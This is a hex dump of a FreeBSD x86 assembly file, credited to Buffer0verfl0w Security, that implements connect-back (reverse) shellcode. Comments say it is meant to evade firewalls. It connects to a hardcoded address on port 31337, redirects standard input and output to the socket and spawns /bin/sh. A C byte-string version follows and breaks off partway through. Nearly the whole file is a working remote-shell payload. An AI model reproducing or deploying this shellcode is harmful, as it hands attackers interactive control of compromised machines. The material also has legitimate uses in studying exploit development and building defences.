00000000  3b 20 50 61 73 73 69 76  65 20 43 6f 6e 6e 65 63  |; Passive Connec|
00000010  74 69 6f 6e 20 53 68 65  6c 6c 63 6f 64 65 0d 0a  |tion Shellcode..|
00000020  3b 0d 0a 3b 20 43 6f 64  65 64 20 62 79 20 53 63  |;..; Coded by Sc|
00000030  72 69 70 70 69 65 20 2d  20 72 6f 6e 61 6c 64 40  |rippie - ronald@|
00000040  67 72 61 66 69 78 2e 6e  6c 20 2d 20 68 74 74 70  |grafix.nl - http|
00000050  3a 2f 2f 62 30 66 2e 66  72 65 65 62 73 64 2e 6c  |://b0f.freebsd.l|
00000060  75 62 6c 69 6e 2e 70 6c  0d 0a 3b 20 42 75 66 66  |ublin.pl..; Buff|
00000070  65 72 30 76 65 72 66 6c  30 77 20 53 65 63 75 72  |er0verfl0w Secur|
00000080  69 74 79 0d 0a 3b 20 57  68 79 3f 20 54 68 69 73  |ity..; Why? This|
00000090  20 65 76 61 64 65 73 20  66 69 72 65 77 61 6c 6c  | evades firewall|
000000a0  73 2e 2e 2e 0d 0a 3b 0d  0a 3b 20 59 45 53 2c 20  |s.....;..; YES, |
000000b0  74 68 69 73 20 69 73 20  66 6f 72 20 4e 41 53 4d  |this is for NASM|
000000c0  2c 20 49 20 64 65 74 65  73 74 20 41 54 26 54 20  |, I detest AT&T |
000000d0  73 79 6e 74 61 78 69 73  20 2d 20 69 74 27 73 20  |syntaxis - it's |
000000e0  67 72 6f 73 73 20 61 6e  64 20 75 6e 72 65 61 64  |gross and unread|
000000f0  61 62 6c 65 0d 0a 3b 0d  0a 3b 20 54 68 69 73 20  |able..;..; This |
00000100  69 73 20 74 68 65 20 46  72 65 65 42 53 44 20 76  |is the FreeBSD v|
00000110  61 72 69 61 6e 74 20 49  20 77 68 69 70 70 65 64  |ariant I whipped|
00000120  20 75 70 0d 0a 3b 0d 0a  3b 20 54 6e 78 20 74 6f  | up..;..; Tnx to|
00000130  20 64 76 6f 72 61 6b 20  66 6f 72 20 70 6f 69 6e  | dvorak for poin|
00000140  74 69 6e 67 20 6f 75 74  20 74 68 61 74 20 42 53  |ting out that BS|
00000150  44 27 73 20 69 6e 74 20  38 30 68 20 61 73 73 75  |D's int 80h assu|
00000160  6d 65 73 20 61 20 73 74  6f 72 65 64 20 45 49 50  |mes a stored EIP|
00000170  0d 0a 3b 20 6f 6e 20 74  68 65 20 73 74 61 63 6b  |..; on the stack|
00000180  20 62 65 66 6f 72 65 20  6d 61 6b 69 6e 67 20 69  | before making i|
00000190  74 20 61 6e 64 20 74 68  61 74 20 42 53 44 20 68  |t and that BSD h|
000001a0  61 73 20 61 20 73 6f 6d  65 77 68 61 74 20 64 69  |as a somewhat di|
000001b0  66 66 65 72 65 6e 74 0d  0a 3b 20 73 6f 63 6b 61  |fferent..; socka|
000001c0  64 64 72 5f 69 6e 20 73  74 72 75 63 74 75 72 65  |ddr_in structure|
000001d0  20 28 63 6f 6e 74 61 69  6e 69 6e 67 20 73 69 6e  | (containing sin|
000001e0  5f 6c 65 6e 29 0d 0a 0d  0a 20 20 20 20 20 20 20  |_len)....       |
000001f0  20 42 49 54 53 20 33 32  0d 0a 0d 0a 3b 20 45 71  | BITS 32....; Eq|
00000200  75 61 74 65 73 20 2d 20  6b 65 65 70 73 20 74 68  |uates - keeps th|
00000210  69 73 20 73 74 75 66 66  20 61 20 6c 6f 74 20 6d  |is stuff a lot m|
00000220  6f 72 65 20 63 6c 65 61  72 0d 0a 0d 0a 50 4f 52  |ore clear....POR|
00000230  54 20 20 20 20 20 20 20  20 20 20 20 20 65 71 75  |T            equ|
00000240  20 33 31 33 33 37 20 20  20 20 20 20 20 20 20 20  | 31337          |
00000250  20 20 20 20 20 3b 20 57  68 61 74 20 61 6e 20 65  |     ; What an e|
00000260  6c 65 65 74 20 70 6f 72  74 21 0d 0a 0d 0a 5f 65  |leet port!...._e|
00000270  78 69 74 20 20 20 20 20  20 20 20 20 20 20 65 71  |xit           eq|
00000280  75 20 31 20 20 20 20 20  20 20 20 20 20 20 20 20  |u 1             |
00000290  20 20 20 20 20 20 3b 20  53 65 65 20 2f 75 73 72  |      ; See /usr|
000002a0  2f 73 72 63 2f 73 79 73  2f 6b 65 72 6e 2f 73 79  |/src/sys/kern/sy|
000002b0  73 63 61 6c 6c 73 2e 63  0d 0a 65 78 65 63 76 65  |scalls.c..execve|
000002c0  20 20 20 20 20 20 20 20  20 20 65 71 75 20 35 39  |          equ 59|
000002d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002e0  20 20 3b 20 53 65 65 20  2f 75 73 72 2f 73 72 63  |  ; See /usr/src|
000002f0  2f 73 79 73 2f 6b 65 72  6e 2f 73 79 73 63 61 6c  |/sys/kern/syscal|
00000300  6c 73 2e 63 0d 0a 64 75  70 32 20 20 20 20 20 20  |ls.c..dup2      |
00000310  20 20 20 20 20 20 65 71  75 20 39 30 20 20 20 20  |      equ 90    |
00000320  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00000330  53 65 65 20 2f 75 73 72  2f 73 72 63 2f 73 79 73  |See /usr/src/sys|
00000340  2f 6b 65 72 6e 2f 73 79  73 63 61 6c 6c 73 2e 63  |/kern/syscalls.c|
00000350  0d 0a 73 6f 63 6b 65 74  20 20 20 20 20 20 20 20  |..socket        |
00000360  20 20 65 71 75 20 39 37  20 20 20 20 20 20 20 20  |  equ 97        |
00000370  20 20 20 20 20 20 20 20  20 20 3b 20 53 65 65 20  |          ; See |
00000380  2f 75 73 72 2f 73 72 63  2f 73 79 73 2f 6b 65 72  |/usr/src/sys/ker|
00000390  6e 2f 73 79 73 63 61 6c  6c 73 2e 63 0d 0a 63 6f  |n/syscalls.c..co|
000003a0  6e 6e 65 63 74 20 20 20  20 20 20 20 20 20 65 71  |nnect         eq|
000003b0  75 20 39 38 20 20 20 20  20 20 20 20 20 20 20 20  |u 98            |
000003c0  20 20 20 20 20 20 3b 20  53 65 65 20 2f 75 73 72  |      ; See /usr|
000003d0  2f 73 72 63 2f 73 79 73  2f 6b 65 72 6e 2f 73 79  |/src/sys/kern/sy|
000003e0  73 63 61 6c 6c 73 2e 63  0d 0a 0d 0a 49 50 50 52  |scalls.c....IPPR|
000003f0  4f 54 4f 5f 54 43 50 20  20 20 20 20 65 71 75 20  |OTO_TCP     equ |
00000400  36 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |6               |
00000410  20 20 20 20 3b 20 53 65  65 20 6e 65 74 69 6e 65  |    ; See netine|
00000420  74 2f 69 6e 2e 68 0d 0a  50 46 5f 49 4e 45 54 20  |t/in.h..PF_INET |
00000430  20 20 20 20 20 20 20 20  65 71 75 20 32 20 20 20  |        equ 2   |
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000450  3b 20 53 65 65 20 73 79  73 2f 73 6f 63 6b 65 74  |; See sys/socket|
00000460  2e 68 0d 0a 53 4f 43 4b  5f 53 54 52 45 41 4d 20  |.h..SOCK_STREAM |
00000470  20 20 20 20 65 71 75 20  31 20 20 20 20 20 20 20  |    equ 1       |
00000480  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 53 65  |            ; Se|
00000490  65 20 73 79 73 2f 73 6f  63 6b 65 74 2e 68 0d 0a  |e sys/socket.h..|
000004a0  0d 0a 73 6f 63 6b 61 64  64 72 5f 69 6e 5f 6f 66  |..sockaddr_in_of|
000004b0  66 20 65 71 75 20 30 0d  0a 73 68 65 6c 6c 5f 6f  |f equ 0..shell_o|
000004c0  66 66 20 20 20 20 20 20  20 65 71 75 20 38 0d 0a  |ff       equ 8..|
000004d0  73 68 65 6c 6c 5f 70 74  72 5f 6f 66 66 20 20 20  |shell_ptr_off   |
000004e0  65 71 75 20 31 36 0d 0a  0d 0a 20 20 20 20 20 20  |equ 16....      |
000004f0  20 20 6a 6d 70 20 73 68  6f 72 74 20 45 6e 64 43  |  jmp short EndC|
00000500  6f 64 65 0d 0a 0d 0a 53  74 61 72 74 3a 0d 0a 20  |ode....Start:.. |
00000510  20 20 20 20 20 20 20 70  6f 70 20 65 73 69 20 20  |       pop esi  |
00000520  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000530  20 20 20 20 20 20 20 3b  20 47 65 74 20 6f 66 66  |       ; Get off|
00000540  73 65 74 20 64 61 74 61  20 69 6e 20 65 73 69 0d  |set data in esi.|
00000550  0a 0d 0a 20 20 20 20 20  20 20 20 78 6f 72 20 65  |...        xor e|
00000560  61 78 2c 20 65 61 78 0d  0a 20 20 20 20 20 20 20  |ax, eax..       |
00000570  20 78 6f 72 20 65 62 78  2c 20 65 62 78 0d 0a 0d  | xor ebx, ebx...|
00000580  0a 20 20 20 20 20 20 20  20 6d 6f 76 20 62 6c 2c  |.        mov bl,|
00000590  20 49 50 50 52 4f 54 4f  5f 54 43 50 20 20 20 20  | IPPROTO_TCP    |
000005a0  20 20 20 20 20 20 20 20  20 3b 20 50 75 73 68 20  |         ; Push |
000005b0  49 50 50 52 4f 54 4f 5f  54 43 50 0d 0a 20 20 20  |IPPROTO_TCP..   |
000005c0  20 20 20 20 20 70 75 73  68 20 65 62 78 0d 0a 20  |     push ebx.. |
000005d0  20 20 20 20 20 20 20 6d  6f 76 20 62 6c 2c 20 53  |       mov bl, S|
000005e0  4f 43 4b 5f 53 54 52 45  41 4d 20 20 20 20 20 20  |OCK_STREAM      |
000005f0  20 20 20 20 20 20 20 3b  20 50 75 73 68 20 53 4f  |       ; Push SO|
00000600  43 4b 5f 53 54 52 45 41  4d 0d 0a 20 20 20 20 20  |CK_STREAM..     |
00000610  20 20 20 70 75 73 68 20  65 62 78 0d 0a 20 20 20  |   push ebx..   |
00000620  20 20 20 20 20 6d 6f 76  20 62 6c 2c 20 50 46 5f  |     mov bl, PF_|
00000630  49 4e 45 54 20 20 20 20  20 20 20 20 20 20 20 20  |INET            |
00000640  20 20 20 20 20 3b 20 50  75 73 68 20 50 46 5f 49  |     ; Push PF_I|
00000650  4e 45 54 0d 0a 20 20 20  20 20 20 20 20 70 75 73  |NET..        pus|
00000660  68 20 65 62 78 0d 0a 20  20 20 20 20 20 20 20 70  |h ebx..        p|
00000670  75 73 68 20 65 62 78 20  20 20 20 20 20 20 20 20  |ush ebx         |
00000680  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00000690  20 53 6b 69 70 70 65 64  20 62 79 20 69 6e 74 20  | Skipped by int |
000006a0  38 30 68 0d 0a 20 20 20  20 20 20 20 20 6d 6f 76  |80h..        mov|
000006b0  20 61 6c 2c 20 73 6f 63  6b 65 74 20 20 20 20 20  | al, socket     |
000006c0  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 53  |             ; S|
000006d0  65 6c 65 63 74 20 73 6f  63 6b 65 74 28 29 20 73  |elect socket() s|
000006e0  79 73 63 61 6c 6c 0d 0a  0d 0a 20 20 20 20 20 20  |yscall....      |
000006f0  20 20 69 6e 74 20 38 30  68 20 20 20 20 20 20 20  |  int 80h       |
00000700  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000710  20 20 3b 20 73 6f 63 6b  65 74 28 41 46 5f 49 4e  |  ; socket(AF_IN|
00000720  45 54 2c 20 53 4f 43 4b  5f 53 54 52 45 41 4d 2c  |ET, SOCK_STREAM,|
00000730  20 49 50 50 52 4f 54 4f  5f 54 43 50 29 0d 0a 20  | IPPROTO_TCP).. |
00000740  20 20 20 20 20 20 20 6d  6f 76 20 65 64 78 2c 20  |       mov edx, |
00000750  65 61 78 20 20 20 20 20  20 20 20 20 20 20 20 20  |eax             |
00000760  20 20 20 20 20 20 20 3b  20 53 61 76 65 20 74 68  |       ; Save th|
00000770  65 20 72 65 73 75 6c 74  69 6e 67 20 73 6f 63 6b  |e resulting sock|
00000780  65 74 20 64 65 73 63 72  69 70 74 6f 72 0d 0a 0d  |et descriptor...|
00000790  0a 20 20 20 20 20 20 20  20 6d 6f 76 20 62 79 74  |.        mov byt|
000007a0  65 20 5b 65 73 69 2b 73  6f 63 6b 61 64 64 72 5f  |e [esi+sockaddr_|
000007b0  69 6e 5f 6f 66 66 2b 31  5d 2c 20 50 46 5f 49 4e  |in_off+1], PF_IN|
000007c0  45 54 20 3b 20 73 69 6e  5f 66 61 6d 69 6c 79 20  |ET ; sin_family |
000007d0  2d 3e 20 50 46 5f 49 4e  45 54 0d 0a 20 20 20 20  |-> PF_INET..    |
000007e0  20 20 20 20 6d 6f 76 20  77 6f 72 64 20 5b 65 73  |    mov word [es|
000007f0  69 2b 73 6f 63 6b 61 64  64 72 5f 69 6e 5f 6f 66  |i+sockaddr_in_of|
00000800  66 2b 32 5d 2c 20 50 4f  52 54 20 20 3b 20 53 65  |f+2], PORT  ; Se|
00000810  74 20 74 68 65 20 70 6f  72 74 20 6e 75 6d 62 65  |t the port numbe|
00000820  72 0d 0a 0d 0a 20 20 20  20 20 20 20 20 6d 6f 76  |r....        mov|
00000830  20 62 6c 2c 20 31 36 20  20 20 20 20 20 20 20 20  | bl, 16         |
00000840  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 73  |             ; s|
00000850  69 7a 65 6f 66 28 73 6f  63 6b 61 64 64 72 5f 69  |izeof(sockaddr_i|
00000860  6e 29 0d 0a 20 20 20 20  20 20 20 20 70 75 73 68  |n)..        push|
00000870  20 65 62 78 0d 0a 0d 0a  20 20 20 20 20 20 20 20  | ebx....        |
00000880  6c 65 61 20 65 62 78 2c  20 5b 65 73 69 2b 73 6f  |lea ebx, [esi+so|
00000890  63 6b 61 64 64 72 5f 69  6e 5f 6f 66 66 5d 20 20  |ckaddr_in_off]  |
000008a0  3b 20 47 65 74 20 6f 66  66 73 65 74 20 73 6f 63  |; Get offset soc|
000008b0  6b 61 64 64 72 5f 69 6e  20 69 6e 74 6f 20 65 62  |kaddr_in into eb|
000008c0  78 0d 0a 20 20 20 20 20  20 20 20 70 75 73 68 20  |x..        push |
000008d0  65 62 78 20 20 20 20 20  20 20 20 20 20 20 20 20  |ebx             |
000008e0  20 20 20 20 20 20 20 20  20 20 20 3b 20 50 75 73  |           ; Pus|
000008f0  68 20 69 74 0d 0a 20 20  20 20 20 20 20 20 70 75  |h it..        pu|
00000900  73 68 20 65 61 78 20 20  20 20 20 20 20 20 20 20  |sh eax          |
00000910  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00000920  53 74 69 6c 6c 20 68 6f  6c 64 73 20 73 6f 63 6b  |Still holds sock|
00000930  66 64 0d 0a 20 20 20 20  20 20 20 20 70 75 73 68  |fd..        push|
00000940  20 65 61 78 20 20 20 20  20 20 20 20 20 20 20 20  | eax            |
00000950  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 43 61  |            ; Ca|
00000960  6e 61 72 79 20 76 61 6c  75 65 0d 0a 0d 0a 20 20  |nary value....  |
00000970  20 20 20 20 20 20 6d 6f  76 20 61 6c 2c 20 63 6f  |      mov al, co|
00000980  6e 6e 65 63 74 20 20 20  20 20 20 20 20 20 20 20  |nnect           |
00000990  20 20 20 20 20 20 3b 20  53 65 6c 65 63 74 20 63  |      ; Select c|
000009a0  6f 6e 6e 65 63 74 28 29  20 73 79 73 63 61 6c 6c  |onnect() syscall|
000009b0  0d 0a 20 20 20 20 20 20  20 20 69 6e 74 20 38 30  |..        int 80|
000009c0  68 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |h               |
000009d0  20 20 20 20 20 20 20 20  20 20 3b 20 63 6f 6e 6e  |          ; conn|
000009e0  65 63 74 28 73 6f 63 6b  66 64 2c 20 73 6f 63 6b  |ect(sockfd, sock|
000009f0  61 64 64 72 5f 69 6e 2c  20 31 30 29 0d 0a 0d 0a  |addr_in, 10)....|
00000a00  20 20 20 20 20 20 20 20  78 6f 72 20 65 62 78 2c  |        xor ebx,|
00000a10  20 65 62 78 0d 0a 20 20  20 20 20 20 20 20 70 75  | ebx..        pu|
00000a20  73 68 20 65 62 78 0d 0a  20 20 20 20 20 20 20 20  |sh ebx..        |
00000a30  70 75 73 68 20 65 64 78  0d 0a 20 20 20 20 20 20  |push edx..      |
00000a40  20 20 6d 6f 76 20 61 6c  2c 20 64 75 70 32 20 20  |  mov al, dup2  |
00000a50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a60  20 20 3b 20 53 65 6c 65  63 74 20 64 75 70 32 20  |  ; Select dup2 |
00000a70  73 79 73 63 61 6c 6c 0d  0a 0d 0a 20 20 20 20 20  |syscall....     |
00000a80  20 20 20 70 75 73 68 20  65 61 78 20 20 20 20 20  |   push eax     |
00000a90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000aa0  20 20 20 3b 20 52 75 69  6e 65 64 0d 0a 20 20 20  |   ; Ruined..   |
00000ab0  20 20 20 20 20 69 6e 74  20 38 30 68 0d 0a 0d 0a  |     int 80h....|
00000ac0  20 20 20 20 20 20 20 20  69 6e 63 20 62 6c 0d 0a  |        inc bl..|
00000ad0  20 20 20 20 20 20 20 20  70 75 73 68 20 65 62 78  |        push ebx|
00000ae0  0d 0a 20 20 20 20 20 20  20 20 70 75 73 68 20 65  |..        push e|
00000af0  64 78 0d 0a 20 20 20 20  20 20 20 20 6d 6f 76 20  |dx..        mov |
00000b00  61 6c 2c 20 64 75 70 32  20 20 20 20 20 20 20 20  |al, dup2        |
00000b10  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 44 6f  |            ; Do|
00000b20  20 74 68 65 20 73 61 6d  65 20 66 6f 72 20 73 74  | the same for st|
00000b30  64 6f 75 74 0d 0a 20 20  20 20 20 20 20 20 0d 0a  |dout..        ..|
00000b40  20 20 20 20 20 20 20 20  70 75 73 68 20 65 61 78  |        push eax|
00000b50  0d 0a 20 20 20 20 20 20  20 20 69 6e 74 20 38 30  |..        int 80|
00000b60  68 0d 0a 0d 0a 20 20 20  20 20 20 20 20 69 6e 63  |h....        inc|
00000b70  20 62 6c 0d 0a 20 20 20  20 20 20 20 20 70 75 73  | bl..        pus|
00000b80  68 20 65 62 78 0d 0a 20  20 20 20 20 20 20 20 70  |h ebx..        p|
00000b90  75 73 68 20 65 64 78 0d  0a 20 20 20 20 20 20 20  |ush edx..       |
00000ba0  20 6d 6f 76 20 61 6c 2c  20 64 75 70 32 20 20 20  | mov al, dup2   |
00000bb0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000bc0  20 3b 20 41 6e 64 20 66  69 6e 61 6c 6c 79 20 66  | ; And finally f|
00000bd0  6f 72 20 73 74 64 65 72  72 0d 0a 0d 0a 20 20 20  |or stderr....   |
00000be0  20 20 20 20 20 70 75 73  68 20 65 61 78 0d 0a 20  |     push eax.. |
00000bf0  20 20 20 20 20 20 20 69  6e 74 20 38 30 68 0d 0a  |       int 80h..|
00000c00  0d 0a 20 20 20 20 20 20  20 20 78 6f 72 20 65 62  |..        xor eb|
00000c10  78 2c 20 65 62 78 0d 0a  20 20 20 20 20 20 20 20  |x, ebx..        |
00000c20  70 75 73 68 20 65 62 78  20 20 20 20 20 20 20 20  |push ebx        |
00000c30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000c40  3b 20 2a 65 6e 76 70 20  3d 3d 20 4e 55 4c 4c 0d  |; *envp == NULL.|
00000c50  0a 0d 0a 20 20 20 20 20  20 20 20 6c 65 61 20 65  |...        lea e|
00000c60  64 69 2c 20 5b 65 73 69  2b 73 68 65 6c 6c 5f 6f  |di, [esi+shell_o|
00000c70  66 66 2b 37 5d 0d 0a 20  20 20 20 20 20 20 20 78  |ff+7]..        x|
00000c80  6f 72 20 65 61 78 2c 20  65 61 78 0d 0a 20 20 20  |or eax, eax..   |
00000c90  20 20 20 20 20 78 6f 72  20 65 63 78 2c 20 65 63  |     xor ecx, ec|
00000ca0  78 0d 0a 20 20 20 20 20  20 20 20 6d 6f 76 20 63  |x..        mov c|
00000cb0  6c 2c 20 39 0d 0a 20 20  20 20 20 20 20 20 72 65  |l, 9..        re|
00000cc0  70 65 20 73 74 6f 73 62  0d 0a 0d 0a 20 20 20 20  |pe stosb....    |
00000cd0  20 20 20 20 6c 65 61 20  65 62 78 2c 20 5b 65 73  |    lea ebx, [es|
00000ce0  69 2b 73 68 65 6c 6c 5f  6f 66 66 5d 20 20 20 20  |i+shell_off]    |
00000cf0  20 20 20 20 3b 20 47 65  74 20 6f 66 66 73 65 74  |    ; Get offset|
00000d00  20 73 68 65 6c 6c 20 69  6e 74 6f 20 65 62 78 0d  | shell into ebx.|
00000d10  0a 20 20 20 20 20 20 20  20 6d 6f 76 20 5b 65 73  |.        mov [es|
00000d20  69 2b 73 68 65 6c 6c 5f  70 74 72 5f 6f 66 66 5d  |i+shell_ptr_off]|
00000d30  2c 20 65 62 78 20 20 20  20 3b 20 53 74 6f 72 65  |, ebx    ; Store|
00000d40  20 69 74 20 61 74 20 73  68 65 6c 6c 5f 6f 66 66  | it at shell_off|
00000d50  0d 0a 20 20 20 20 20 20  20 20 6c 65 61 20 65 63  |..        lea ec|
00000d60  78 2c 20 5b 65 73 69 2b  73 68 65 6c 6c 5f 70 74  |x, [esi+shell_pt|
00000d70  72 5f 6f 66 66 5d 20 20  20 20 3b 20 47 65 74 20  |r_off]    ; Get |
00000d80  6f 66 66 73 65 74 20 73  68 65 6c 6c 5f 6f 66 66  |offset shell_off|
00000d90  20 69 6e 74 6f 20 65 63  78 0d 0a 20 20 20 20 20  | into ecx..     |
00000da0  20 20 20 70 75 73 68 20  65 63 78 20 20 20 20 20  |   push ecx     |
00000db0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000dc0  20 20 20 3b 20 61 72 67  70 0d 0a 20 20 20 20 20  |   ; argp..     |
00000dd0  20 20 20 70 75 73 68 20  65 62 78 20 20 20 20 20  |   push ebx     |
00000de0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000df0  20 20 20 3b 20 63 6f 6d  6d 61 6e 64 0d 0a 0d 0a  |   ; command....|
00000e00  20 20 20 20 20 20 20 20  70 75 73 68 20 65 61 78  |        push eax|
00000e10  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000e20  20 20 20 20 20 20 20 20  3b 20 63 61 6e 61 72 79  |        ; canary|
00000e30  0d 0a 20 20 20 20 20 20  20 20 6d 6f 76 20 61 6c  |..        mov al|
00000e40  2c 20 65 78 65 63 76 65  0d 0a 20 20 20 20 20 20  |, execve..      |
00000e50  20 20 69 6e 74 20 38 30  68 20 20 20 20 20 20 20  |  int 80h       |
00000e60  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000e70  20 20 3b 20 53 70 61 77  6e 20 74 68 65 20 66 72  |  ; Spawn the fr|
00000e80  69 6b 6b 69 6e 27 20 73  68 65 6c 6c 0d 0a 0d 0a  |ikkin' shell....|
00000e90  20 20 20 20 20 20 20 20  6d 6f 76 20 61 6c 2c 20  |        mov al, |
00000ea0  5f 65 78 69 74 20 20 20  20 20 20 20 20 20 20 20  |_exit           |
00000eb0  20 20 20 20 20 20 20 20  3b 20 5f 65 78 69 74 28  |        ; _exit(|
00000ec0  29 20 73 79 73 74 65 6d  20 63 61 6c 6c 0d 0a 20  |) system call.. |
00000ed0  20 20 20 20 20 20 20 69  6e 74 20 38 30 68 20 20  |       int 80h  |
00000ee0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000ef0  20 20 20 20 20 20 20 3b  20 44 6f 20 69 74 0d 0a  |       ; Do it..|
00000f00  0d 0a 45 6e 64 43 6f 64  65 3a 0d 0a 20 20 20 20  |..EndCode:..    |
00000f10  20 20 20 20 63 61 6c 6c  20 53 74 61 72 74 0d 0a  |    call Start..|
00000f20  0d 0a 73 6f 63 6b 61 64  64 72 5f 69 6e 20 20 20  |..sockaddr_in   |
00000f30  20 20 64 62 20 27 41 42  43 43 27 20 20 20 20 20  |  db 'ABCC'     |
00000f40  20 20 20 20 20 20 20 20  20 20 3b 20 41 3d 73 69  |          ; A=si|
00000f50  6e 5f 6c 65 6e 20 2d 20  42 3d 73 69 6e 5f 66 61  |n_len - B=sin_fa|
00000f60  6d 69 6c 79 20 2d 20 43  3d 70 6f 72 74 0d 0a 20  |mily - C=port.. |
00000f70  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 64  |               d|
00000f80  64 20 30 78 31 30 30 30  30 37 66 20 20 20 20 20  |d 0x100007f     |
00000f90  20 20 20 20 20 20 20 3b  20 49 50 20 61 64 64 72  |       ; IP addr|
00000fa0  20 28 73 5f 61 64 64 72  29 20 69 6e 20 68 74 6f  | (s_addr) in hto|
00000fb0  6e 6c 28 29 20 66 6f 72  6d 0d 0a 3b 20 38 20 62  |nl() form..; 8 b|
00000fc0  79 74 65 73 20 6e 6f 74  20 6e 65 65 64 65 64 20  |ytes not needed |
00000fd0  3b 29 0d 0a 0d 0a 73 68  65 6c 6c 20 20 20 20 20  |;)....shell     |
00000fe0  20 20 20 20 20 20 64 62  20 27 2f 62 69 6e 2f 73  |      db '/bin/s|
00000ff0  68 27 20 3b 2c 30 0d 0a  3b 73 68 65 6c 6c 5f 70  |h' ;,0..;shell_p|
00001000  74 72 20 20 20 20 20 20  64 62 20 31 2c 32 2c 33  |tr      db 1,2,3|
00001010  2c 34 0d 0a 0d 0a 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |,4....----------|
00001020  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00001060  2d 2d 2d 2d 0d 0a 0d 0a  41 6e 64 20 68 65 72 65  |----....And here|
00001070  27 73 20 74 68 65 20 73  68 65 6c 6c 63 6f 64 65  |'s the shellcode|
00001080  20 65 71 75 69 76 61 6c  65 6e 74 0d 0a 0d 0a 63  | equivalent....c|
00001090  68 61 72 20 73 68 65 6c  6c 63 6f 64 65 5b 5d 3d  |har shellcode[]=|
000010a0  0d 0a 22 5c 78 65 62 5c  78 36 38 5c 78 35 65 5c  |.."\xeb\x68\x5e\|
000010b0  78 33 31 5c 78 63 30 5c  78 33 31 5c 78 64 62 5c  |x31\xc0\x31\xdb\|
000010c0  78 62 33 5c 78 30 36 5c  78 35 33 5c 78 62 33 5c  |xb3\x06\x53\xb3\|
000010d0  78 30 31 5c 78 35 33 5c  78 62 33 5c 78 30 32 5c  |x01\x53\xb3\x02\|
000010e0  78 35 33 5c 78 35 33 5c  78 62 30 5c 78 36 31 5c  |x53\x53\xb0\x61\|
000010f0  78 0d 0a 63 64 5c 78 38  30 5c 78 38 39 5c 78 63  |x..cd\x80\x89\xc|
00001100  32 5c 78 63 36 5c 78 34  36 5c 78 30 31 5c 78 30  |2\xc6\x46\x01\x0|
00001110  32 5c 78 36 36 5c 78 63  37 5c 78 34 36 5c 78 30  |2\x66\xc7\x46\x0|
00001120  32 5c 78 36 39 5c 78 37  61 5c 78 62 33 5c 78 31  |2\x69\x7a\xb3\x1|
00001130  30 5c 78 35 33 5c 78 38  64 5c 78 31 65 5c 78 35  |0\x53\x8d\x1e\x5|
00001140  33 5c 0d 0a 78 35 30 5c  78 35 30 5c 78 62 30 5c  |3\..x50\x50\xb0\|
00001150  78 36 32 5c 78 63 64 5c  78 38 30 5c 78 33 31 5c  |x62\xcd\x80\x31\|
00001160  78 64 62 5c 78 35 33 5c  78 35 32 5c 78 62 30 5c  |xdb\x53\x52\xb0\|
00001170  78 35 61 5c 78 35 30 5c  78 63 64 5c 78 38 30 5c  |x5a\x50\xcd\x80\|
00001180  78 66 65 5c 78 63 33 5c  78 35 33 5c 78 35 32 5c  |xfe\xc3\x53\x52\|
00001190  78 62 30 0d 0a 5c 78 35  61 5c 78 35 30 5c 78 63  |xb0..\x5a\x50\xc|
000011a0  64 5c 78 38 30 5c 78 66  65 5c 78 63 33 5c 78 35  |d\x80\xfe\xc3\x5|
000011b0  33 5c 78 35 32 5c 78 62  30 5c 78 35 61 5c 78 35  |3\x52\xb0\x5a\x5|
000011c0  30 5c 78 63 64 5c 78 38  30 5c 78 33 31 5c 78 64  |0\xcd\x80\x31\xd|
000011d0  62 5c 78 35 33 5c 78 38  64 5c 78 37 65 5c 78 30  |b\x53\x8d\x7e\x0|
000011e0  66 5c 78 33 0d 0a 31 5c  78 63 30 5c 78 33 31 5c  |f\x3..1\xc0\x31\|
000011f0  78 63 39 5c 78 62 31 5c  78 30 39 5c 78 66 33 5c  |xc9\xb1\x09\xf3\|
00001200  78 61 61 5c 78 38 64 5c  78 35 65 5c 78 30 38 5c  |xaa\x8d\x5e\x08\|
00001210  78 38 39 5c 78 35 65 5c  78 31 30 5c 78 38 64 5c  |x89\x5e\x10\x8d\|
00001220  78 34 65 5c 78 31 30 5c  78 35 31 5c 78 35 33 5c  |x4e\x10\x51\x53\|
00001230  78 35 30 5c 78 0d 0a 62  30 5c 78 33 62 5c 78 63  |x50\x..b0\x3b\xc|
00001240  64 5c 78 38 30 5c 78 62  30 5c 78 30 31 5c 78 63  |d\x80\xb0\x01\xc|
00001250  64 5c 78 38 30 5c 78 65  38 5c 78 39 33 5c 78 66  |d\x80\xe8\x93\xf|
00001260  66 5c 78 66 66 5c 78 66  66 5c 78 34 31 5c 78 34  |f\xff\xff\x41\x4|
00001270  32 5c 78 34 33 5c 78 34  33 5c 78 37 66 5c 78 30  |2\x43\x43\x7f\x0|
00001280  30 5c 78 30 30 5c 0d 0a  78 30 31 5c 78 32 66 5c  |0\x00\..x01\x2f\|
00001290  78 36 32 5c 78 36 39 5c  78 36 65 5c 78 32 66 5c  |x62\x69\x6e\x2f\|
